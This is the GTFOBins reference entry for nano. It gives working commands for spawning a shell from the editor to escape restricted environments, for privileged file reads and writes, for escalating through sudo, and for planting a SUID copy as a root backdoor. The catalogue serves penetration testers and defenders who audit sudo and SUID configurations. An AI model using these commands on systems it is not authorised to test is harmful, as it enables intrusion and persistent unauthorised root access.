# GTFOBin: nano

## Shell

It can be used to break out from restricted environments by spawning an interactive system shell.

```
nano
^R^X
reset; sh 1>&0 2>&0
```

The `SPELL` environment variable can be used in place of the `-s` option if the command line cannot be changed.

```
nano -s /bin/sh
/bin/sh
^T
```

## File write

It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.

```
nano file_to_write
DATA
^O
```

## File read

It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.

```
nano file_to_read
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

```
sudo nano
^R^X
reset; sh 1>&0 2>&0
```

## Limited SUID

If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via `system()`-like invocations) it only works on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.

This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.

The `SPELL` environment variable can be used in place of the `-s` option if the command line cannot be changed.

```
sudo install -m =xs $(which nano) .

./nano -s /bin/sh
/bin/sh
^T
```